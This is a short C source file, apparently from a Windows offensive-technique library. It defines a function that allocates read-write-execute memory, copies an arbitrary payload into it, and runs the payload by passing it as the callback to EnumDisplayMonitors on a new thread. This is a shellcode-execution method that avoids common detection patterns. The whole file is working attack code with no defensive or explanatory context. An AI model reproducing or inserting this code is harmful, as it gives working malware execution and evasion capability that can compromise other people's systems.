#include "Win32Helper.h"

VOID InvokeEnumDisplayMonitorsThreadCallbackRoutine(LPVOID lpParameter)
{
	EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)lpParameter, NULL);
}

BOOL MpfSceViaEnumDisplayMonitors(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumDisplayMonitorsThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}